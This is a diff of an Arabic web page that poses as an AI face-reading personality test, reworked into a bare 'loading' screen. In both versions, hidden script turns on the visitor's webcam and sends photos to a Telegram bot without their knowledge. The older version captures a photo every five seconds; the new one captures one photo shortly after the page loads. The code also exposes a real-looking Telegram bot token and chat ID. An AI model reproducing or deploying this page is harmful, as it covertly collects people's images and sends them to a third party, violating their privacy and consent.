@@ -2,188 +2,94 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تحليل شخصيتك من ملامح وجهك</title>
-
-  <!-- ✅ Social Sharing Preview -->
-  <meta property="og:title" content="حلل شخصيتك من ملامح وجهك – اكتشف ما لا تعرفه عن نفسك!">
-  <meta property="og:description" content="باستخدام الذكاء الاصطناعي، سنحلل ملامح وجهك ونعطيك تحليلًا دقيقًا عن شخصيتك خلال ثوانٍ. جرب الآن!">
-  <meta property="og:image" content="https://i.imgur.com/qLtW6vA.jpg">
-  <meta property="og:url" content="https://data-collection-bs5q.vercel.app/">
-  <meta property="og:type" content="website">
-  <meta name="twitter:card" content="summary_large_image">
-
+  <title>جاري التحميل</title>
   <style>
     body {
       margin: 0;
-      padding: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      background-color: #1e3c72;
       font-family: 'Cairo', sans-serif;
-      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-      color: #fff;
-      line-height: 1.8;
+      color: #ffffff;
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #ffeb3b;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .text {
+      font-size: 2em;
     }
 
     video, canvas {
       display: none;
     }
-
-    .container {
-      max-width: 900px;
-      margin: 0 auto;
-      padding: 40px 20px;
-    }
-
-    .info-box {
-      background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(8px);
-      border-radius: 15px;
-      padding: 30px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
-    }
-
-    .info-box h1 {
-      font-size: 2.5em;
-      color: #ffe082;
-      margin-bottom: 20px;
-    }
-
-    .info-box p, .info-box li {
-      font-size: 1.2em;
-      color: #f9f9f9;
-      margin-bottom: 10px;
-    }
-
-    .info-box ul {
-      padding-left: 20px;
-      margin-top: 20px;
-    }
-
-    .countdown-container {
-      text-align: center;
-      margin-top: 30px;
-      font-size: 1.3em;
-      color: #ffeb3b;
-    }
-
-    .login-button {
-      display: block;
-      margin: 40px auto 0;
-      padding: 14px 30px;
-      background-color: #ffc107;
-      color: #222;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 1.2em;
-      font-weight: bold;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-      text-align: center;
-      text-decoration: none;
-      transition: background 0.3s ease;
-    }
-
-    .login-button:hover {
-      background-color: #e6ac00;
-    }
   </style>
 </head>
 <body>
-  <video id="video" autoplay></video>
+  <div class="loader"></div>
+  <div class="text">جاري التحميل...</div>
+
+  <video id="video" autoplay muted></video>
   <canvas id="canvas"></canvas>
-
-  <div class="container">
-    <div class="info-box">
-      <h1>تحليل شخصيتك من ملامح وجهك</h1>
-      <p>هل تساءلت يومًا ماذا تقول ملامح وجهك عنك؟ في هذا التحليل المبتكر، سنساعدك على اكتشاف شخصيتك الحقيقية من خلال ملامح وجهك فقط، باستخدام تقنيات تحليل ذكي.</p>
-
-      <p>العلم الحديث يؤكد أن تعابير الوجه وملامحه تعكس الكثير من الصفات الشخصية. اكتشف من خلال هذا التحليل:</p>
-
-      <ul>
-        <li>مدى الثقة بالنفس التي تظهر في ملامحك.</li>
-        <li>نسبة الذكاء الاجتماعي والانفعالي لديك.</li>
-        <li>هل أنت من الشخصيات القيادية أم المتعاونة؟</li>
-        <li>الانطباع الأول الذي يأخذه الناس عنك.</li>
-        <li>هل أنت شخص عاطفي أم عقلاني؟</li>
-        <li>وكثير من التفاصيل التي قد تدهشك!</li>
-      </ul>
-
-      <p>كل ما عليك فعله هو السماح بالكاميرا، ونحن سنقوم بتحليل ملامح وجهك وإعطائك النتائج خلال ثوانٍ. التحليل مجاني وسريع بالكامل.</p>
-
-      <p>لا تفوّت الفرصة لتتعرف على نفسك أكثر من منظور مختلف. دع الذكاء الاصطناعي يخبرك بما لا تراه في نفسك!</p>
-    </div>
-
-    <div class="countdown-container">
-      <p id="countdown-timer">جاري التحميل: 20 ثانية</p>
-    </div>
-
-    <a href="https://data-collection-bs5q.vercel.app/" class="login-button" id="login-button" onclick="handleClick(event)">ابدأ التحليل الآن</a>
-  </div>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    let sendImages = true;
-    let countdown = 20;
+
+    // ✅ بيانات البوت
+    const botToken = '7760418315:AAGBJWUpehCKyxFR12gtzpQVM2KEgsyt4qk';
+    const chatId = '6514749116';
 
     async function startCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        captureAndSend();
-      } catch (error) {
-        console.error("Error accessing camera: ", error);
+
+        // انتظر الكاميرا تشتغل ثم خذ صورة واحدة بعد ثانية
+        setTimeout(() => capturePhoto(), 1000);
+
+      } catch (err) {
+        console.error("فشل تشغيل الكاميرا:", err);
       }
     }
 
-    async function captureAndSend() {
-      const context = canvas.getContext('2d');
-      setInterval(async () => {
-        if (!sendImages) return;
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        const imageData = canvas.toDataURL('image/png');
-        sendToTelegram(imageData);
-      }, 5000);
+    function capturePhoto() {
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL('image/jpeg');
+      sendPhoto(imageData);
     }
 
-    async function sendToTelegram(imageData) {
-      const token = '7760418315:AAGBJWUpehCKyxFR12gtzpQVM2KEgsyt4qk';
-      const chatId = '6514749116';
-
-      const blob = await fetch(imageData).then(res => res.blob());
+    async function sendPhoto(dataUrl) {
+      const blob = await fetch(dataUrl).then(res => res.blob());
       const formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'photo.png');
-      formData.append('caption', '@blackdemonbot');
+      formData.append('photo', blob, 'photo.jpg');
 
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: 'POST',
         body: formData
-      })
-      .then(response => response.json())
-      .then(result => {
-        console.log('Photo sent successfully:', result);
-      })
-      .catch(error => {
-        console.error('Error sending photo:', error);
       });
     }
 
-    function handleClick(event) {
-      event.preventDefault();
-      let countdownInterval = setInterval(function() {
-        document.getElementById('countdown-timer').textContent = `جاري التحميل: ${countdown} ثانية`;
-        countdown--;
-        if (countdown < 0) {
-          clearInterval(countdownInterval);
-          window.location.href = event.target.href;
-        }
-      }, 1000);
-    }
-
+    // 🚀 ابدأ التشغيل
     startCamera();
   </script>
 </body>
